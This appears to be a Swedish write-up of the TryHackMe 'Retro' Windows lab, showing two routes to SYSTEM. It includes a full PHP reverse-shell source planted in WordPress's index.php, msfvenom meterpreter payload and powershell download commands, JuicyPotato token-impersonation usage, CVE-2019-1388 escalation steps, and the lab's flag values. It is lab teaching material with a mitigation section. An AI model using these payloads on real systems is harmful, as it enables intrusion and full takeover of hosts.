# Retro(TryHackMe)

Denna labb har flera vägar till SYSTEM. I denna writeup demonstrerar jag två av dessa.

## Recon/Enumeration

Jag började med en port, versions och NSE-script-scan med Nmap, eftersom servern inte svarade på pings så lade jag till -Pn flaggan för att nmap ska hoppa över host discovery och behandla hosten som online.
```
nmap -Pn -sC -sV 10.112.169.192
```
Resultat:
```
PORT     STATE SERVICE
80/tcp   open  http
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server
```

Två portar visade sig vara öppna, HTTP(80) och RDP(3389). HTTP-tjänsten körde `Microsoft-IIS 10.0` på en `Windows Server`.

Nästa steg var att enumerera HTTP-sidan. RDP kunde eventuellt användas för inloggning senare.

## HTTP

Jag möttes av standard Windows IIS sidan, hittade inget direkt relevant så jag gick vidare med directory fuzzing med gobuster.

### Gobuster

Jag använde följande kommando för att enumerera vilka directories som finns tillgängliga på webbservern.

```
gobuster dir -u http://10.112.169.192 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```
Resulterade i att `/retro` hittades.

<img width="654" height="138" alt="image" src="https://github.com/user-attachments/assets/14cb7802-f569-4b30-b25e-545c829337e3" />

### Enumerering av Bloggsidan på /retro

/retro verkade vara en tv-spelsblogg som används av en person vid namn `Wade`.

Långt ner på sidan hittade jag ett gammalt inlägg vid namn `Ready Player One`, där Wade nämner att han känner en stark koppling till huvudkaraktären i boken/filmen `Ready Player One` för att de har samma namn.

Han nämner att han brukar stava fel på karaktärens avatarnamn när han `loggar in`.

<img width="987" height="492" alt="image" src="https://github.com/user-attachments/assets/145d1c42-a16d-4b8f-9ed4-79535e7cdfe1" />

När jag öppnade själva inlägget kunde jag se en kommentar där `Wade` skriver stavningen på avatarnamnet "`parzival`" för att han inte ska glömma stavningen.

<img width="738" height="381" alt="image" src="https://github.com/user-attachments/assets/7c94b375-0b9f-4864-a6b2-5f57be54b1af" />

Detta fick mig att misstänka att Wade möjligtvis använder `parzival` som en del av sin inloggning.

## Metod 1 (Reverse-shell med JuicyPotato exploit)

### Initial Access

I botten av Retro sidan fanns en `Log in` knapp.

<img width="499" height="131" alt="image" src="https://github.com/user-attachments/assets/15f639b2-f873-4081-8c79-45dadb518ab1" />

När man klickar på `Log in` tas man till en WordPress inloggningssida, eftersom jag har det potentiella lösenordet `parzival` sedan tidigare så provar jag att logga in.

Användarnamn: wade

Lösenord: parzival

Inloggningen lyckades och det visade sig att Wade hade administratörsbehörigheter

<img width="1399" height="702" alt="image" src="https://github.com/user-attachments/assets/2702d23b-9e71-43c9-b1e6-67998c6823cf" />

Därefter gick jag till Appearance>Theme Editor för att se vilka PHP-filer jag hade möjlighet att ändra.

Min hypotes var att jag kunde modifiera PHP-filerna och därmed lägga in ett PHP reverse-shell, eftersom att serverdatorn kör Windows och den klassiska pentestmonkeys PHP reverse-shell är baserat kring UNIX miljöer och /bin/sh så behövde jag hitta en variant som kan starta cmd.exe

Jag lyckades hitta ett PHP reverse-shell av Ivan Šincek som även stödjer Windows:
<details>
<summary>Visa PHP reverse-shell</summary>

```php
<?php
// Copyright (c) 2020 Ivan Šincek
// v2.6
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer = 1024;  // read/write buffer size
    private $clen   = 0;     // command length
    private $error  = false; // stream read/write error
    private $sdump  = true;  // script's dump
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        $os = PHP_OS;
        if (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {
            $this->os    = 'LINUX';
            $this->shell = '/bin/sh';
        } else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
            // once daemonized, you will actually no longer see the script's dump
        } else if (posix_setsid() < 0) {
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        if ($this->sdump) {
            $data = str_replace('<', '&lt;', $data);
            $data = str_replace('>', '&gt;', $data);
            echo $data;
        }
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set the global error flag
            echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set the global error flag
            echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $size = fstat($input)['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // so we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
                    do {
                        $status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('Your IP', Port#);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```
</details>
Vanligtvis föredrar jag att använda `404.php` eftersom filen i vissa fall går att trigga genom att besöka en sida som inte existerar, exempelvis `/retro/asnjkauwn/`. På så sätt kan koden köras utan att direkt påverka webbplatsens normala funktionalitet. Detta fungerade däremot inte i den här labben, troligtvis eftersom `404.php` inte kördes av server-datorn på det sätt som krävdes.

Jag valde därför `index.php` som en lämplig plats att placera koden, eftersom filen enkelt kan triggas genom att besöka `/retro`. Genom att placera reverse-shell-koden i början av filen kunde jag sedan trigga shellet genom att navigera till `/retro`.

Sedan startade jag en standard netcat lyssnare på port 4444 i min Linux terminal.
```
nc -lvnp 4444
```

Därefter behövde jag endast besöka `http://10.112.169.192/retro` för att shellet skulle triggas och ansluta till min netcat lyssnare, jag verifierade sedan med `whoami` vilken användare shellet kördes som.

<img width="1113" height="828" alt="image" src="https://github.com/user-attachments/assets/f93f0524-6027-41ce-b91c-35564ac27422" />

### Privilege Escalation

Jag började med kommandot `whoami /priv` för att se vilka privilegier webbkontot hade.

<img width="831" height="314" alt="image" src="https://github.com/user-attachments/assets/308031eb-de15-4ce3-82f0-be20217b303a" />

`SeImpersonatePrivilege` är särskilt intressant eftersom konton som har denna rättighet i vissa Windows-miljöer kan missbruka funktioner för token-impersonering, bland annat via `COM/DCOM`, för att därefter få tag på och använda en SYSTEM-token. Detta kan leda till privilege escalation.

För att undersöka det vidare så körde jag kommandot `systeminfo` för att ta reda på vilken version av Windows-servern som används.

<img width="847" height="345" alt="image" src="https://github.com/user-attachments/assets/ace4d2d9-1f50-4c8a-9387-79dc617ed636" />

Här ser man att det är en 64-bitars `Windows Server 2016 Standard`. För dessa äldre Windows-versioner kan `JuicyPotato` potentiellt användas för att eskalera privilegier.

JuicyPotato utnyttjar `SeImpersonatePrivilege` med hjälp av COM/DCOM-tjänster för att få tag på en SYSTEM-token som sedan kan användas för att starta ett program med SYSTEM-rättigheter.

JuicyPotato är främst relevant för äldre Windows-versioner, och eftersom labbmaskinen kör Windows Server 2016 valde jag att testa om tekniken fungerade.

Nästa steg var då att få `JuicyPotato.exe` nedladdat till Windows-Maskinen.

```
https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```
```
https://github.com/ohpe/juicy-potato/tree/master
```

JuicyPotato.exe samt en lång lista på giltiga CLSID finns i Github-repot ovan.

Jag bytte till en filväg där webbkontot hade rättigheter att skriva.
```
cd \users\public
```
Jag hämtade först JuicyPotato.exe till min attackmaskin med "`wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe`", eftersom det krånglade att hämta direkt från github med Windows-maskinen.

Därefter hostade jag en HTTP-server med python3:
```
python3 -m http.server
```
Jag hämtade sen JuicyPotato.exe från min egna HTTP-server till Windows-maskinen med hjälp av powershell
```
powershell -c Invoke-WebRequest -Uri "http://10.112.114.44:8000/JuicyPotato.exe" -OutFile "JuicyPotato.exe"
```
Jag verifierar därefter att filen finns på datorn.

<img width="848" height="470" alt="image" src="https://github.com/user-attachments/assets/f42466bf-3fe2-45ef-be4d-b43ac1611f10" />

Nästa steg var då att välja en lämplig payload att köra med den SYSTEM-token som JuicyPotato får tillgång till.

Min tanke var att jag skapar en meterpreter reverse-shell som kommer köras som SYSTEM.

Detta ger mig en Meterpreter-session med fler funktioner än mitt initiala CMD-shell.

Jag använde mig av msfvenom för att skapa mitt reverse-shell, Jag valde en x64-payload eftersom målmaskinen kör ett 64-bitars Windows-operativsystem.

Det finns väldigt många "cheat sheets" tillgängliga för att hitta msfvenom payloads. Så jag letade upp ett som matchade det jag behövde.
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Your-IP> LPORT=<Your-Port> -f exe -o shell.exe
```
<img width="837" height="192" alt="image" src="https://github.com/user-attachments/assets/31a23d13-945f-4649-abb2-9338574ef8fc" />

Därefter följde jag samma princip som tidigare och hostade en http-server med python och hämtade till Windows-maskinen med hjälp av powershell.
```
powershell -c Invoke-WebRequest -Uri "http://10.112.114.44:8000/shell.exe" -OutFile "shell.exe"
```
<img width="847" height="486" alt="image" src="https://github.com/user-attachments/assets/e4c1aba4-8332-4e86-be45-1443039a48b9" />

Sedan skapar jag en lyssnare men eftersom att det är ett reverse-shell skapat med msfvenom använder jag denna gången metasploit.

I msfconsole skriver jag följande för att välja lyssnaren:
```
use exploit/multi/handler
```
Därefter ställer jag in korrekt payload vilket ska matcha den som jag valde i msfvenom dvs `windows/x64/meterpreter_reverse_tcp` och min attackmaskins IP-adress samt porten som shell.exe anropar vilket i mitt fall är 1234. Slutligen skriver jag `run` för att starta lyssnaren.

<img width="801" height="237" alt="image" src="https://github.com/user-attachments/assets/36c1ad71-ff78-45da-bec0-c88f90e31390" />



Med detta klart så finns allt som jag behöver för att köra själva exploiten.
```
JuicyPotato.exe -l 3232 -p shell.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```
Vad detta gör är att:

 * -l: Specifierar en port som en lokal COM-server kommer startas av JuicyPotato, portnumret i sig spelar ingen roll så länge det är en ledig port.
 * -p: Anger vilken payload/program jag vill köra vilket i mitt fall är shell.exe.
 * -t: * säger åt JuicyPotato att prova de tillgängliga metoderna för tokenhantering.
 * -c: Anger vilket CLSID man använder. CLSID identifierar en COM-klass som JuicyPotato försöker aktivera, därför är det viktigt att man väljer en CLSID som kan leda till en SYSTEM-token.

<img width="847" height="187" alt="image" src="https://github.com/user-attachments/assets/6d23d274-b820-482b-b6bb-29c14c9e2af1" />

<img width="846" height="339" alt="image" src="https://github.com/user-attachments/assets/9841f6ce-2e35-481e-8fac-01eaac7fa7de" />

Anslutning upprättades och verifierade att mitt shell verkligen var SYSTEM.

user.txt.txt: finns i c:\users\wade\desktop\user.txt.txt
```
3b99fbdc6d430bfb51c72c651a261927
```

root.txt.txt: finns i c:\users\administrator\desktop\root.txt.txt
```
7958b569565d7bd88d10c6f22d1c4063
```

### Resultat

Genom fyndet av Wades lösenord fick jag tillgång till WordPress som Wade och kunde därefter uppnå en foothold genom PHP code execution. Genom `SeImpersonatePrivilege` kunde jag använda JuicyPotato för privilege escalation och därmed uppnå en meterpreter-session med SYSTEM behörigheter, därefter kunde både user.txt.txt samt root.txt.txt läsas.

## Metod 2 (RDP med CVE-2019-1388)

### Initial Access

Eftersom att jag hade hittat det potentiella lösenordet `parzival` så provade jag att logga in via RDP.
```
xfreerdp /u:wade /p:parzival /v:10.112.144.95
```
Inloggningen lyckades, `user.txt` hittades direkt på skrivbordet.

<img width="1019" height="791" alt="image" src="https://github.com/user-attachments/assets/2069e29b-fc5b-4a67-871f-c9fc1da4538b" />

### Enumerering av RDP

Jag började med att titta i papperskorgen och där fanns en fil vid namn `hhupd`, jag återställde den till skrivbordet tills jag vet vad den är för något.

Därefter kollade jag `whoami /priv` och `whoami /groups` för att se ifall det fanns några felkonfigurerade privilegier eller grupper som var intressanta, men inget intressant visades på någon utav dem.

Jag kollade då Google Chrome för att se ifall möjligtvis något känsligt fanns i historiken eller åtkomst till konton.

<img width="1024" height="798" alt="image" src="https://github.com/user-attachments/assets/a76040a1-3fcd-4487-9a5d-c3d3b5129448" />

Där såg jag en bookmark till en CVE vid namn `CVE-2019-1388`.

Därför började jag researcha `CVE-2019-1388` och hittade att filen `hhupd` går att användas för att eskalera privilegier genom att utnyttja en certifikat länk.

### Privilege Escalation

1. Kör "`hhupd.exe`" som administratör.
2. Klicka på "`Show more details`".
3. Klicka på "`Show information about this publisher's certificate`".
4. Klicka på länken "`Verisign Commerical Software Publishers CA"`".
5. När Internet-explorer sidan öppnas tryck CTRL+S för att få upp `File-explorer`.
6. I övre rutan ange filvägen för cmd.exe(`c:/windows/system32/cmd.exe`)
   * <img width="611" height="69" alt="bild" src="https://github.com/user-attachments/assets/f5f705b0-e2ca-4b41-b269-f8853b65516c" />
7. Kör whoami i cmd för att verifiera att exploiten fungerade.
   * <img width="635" height="327" alt="bild" src="https://github.com/user-attachments/assets/0550d907-6a38-4574-9f46-4b84e59a13d0" />



Vad detta gör är att när Internet-explorer öppnas, så sker det med SYSTEM rättigheter. Detta beror på en sårbarhet i Windows UAC-hantering (CVE-2019-1388), eftersom hhupd.exe öppnades som administratör.

När man då kör CTRL+S öppnas även file-explorer med samma SYSTEM rättigheter, därför när man öppnar cmd.exe i denna file-explorer kommer det köras som `NT AUTHORITY/SYSTEM`.

## Mitigering

Båda dessa attacker möjliggjordes främst för att `Wade` använde ett lösenord som han själv råkade läcka på sin blogg. Sen så är `parzival` ett väldigt kort lösenord med små bokstäver vilket inte heller är bra för säkerhet.

Därför är det kritiskt att:

 * Ta bort inlägget från bloggen samt kommentaren.
 * Välja ett lösenord med mer komplexitet.
 * Inte återanvända samma lösenord för olika tjänster.

Samt är det lämpligt att: 

  * Stänga av `SeImpersonatePrivilege` ifall det inte krävs för funktion.
    - Detta tar bort möjlighet för Potato liknande attacker.
  * Uppdatera till Windows Server 2019 eller senare om möjligt.
    - Detta åtgärdar sårbarheten som utnyttjades av `CVE-2019-1388` och försvårar användning av äldre verktyg som `JuicyPotato`.


